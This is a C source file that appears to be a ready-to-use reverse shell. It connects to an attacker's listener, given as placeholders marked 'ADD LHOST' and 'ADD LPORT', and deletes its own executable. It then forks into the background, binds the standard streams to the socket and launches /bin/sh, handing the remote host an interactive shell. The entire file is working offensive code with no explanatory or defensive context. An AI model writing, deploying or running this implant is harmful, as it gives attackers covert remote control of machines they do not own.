#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

int main(int argc, char* argv[]) {

    argv[1]="XX.XX.XX.XX";   //ADD LHOST
    argv[2]="YYYY";        //ADD LPORT

    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(argv[1]);
    sa.sin_port = htons(atoi(argv[2]));

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
        perror("Failed to connect");
        exit(errno);
    }
   
    remove(argv[0]);

    pid_t pid = fork();
    if (pid == -1) {
        perror("Failed to fork");
        close(s);
        exit(errno);
    } else if (pid > 0) {
        exit(0);
    }

    dup2(s, 0);  
    dup2(s, 1);  
    dup2(s, 2);  

    char* shell_args[] = {"/bin/sh", NULL};
    execve("/bin/sh", shell_args, NULL);

    perror("Failed to execute shell");
    close(s);
    
    return errno;
}
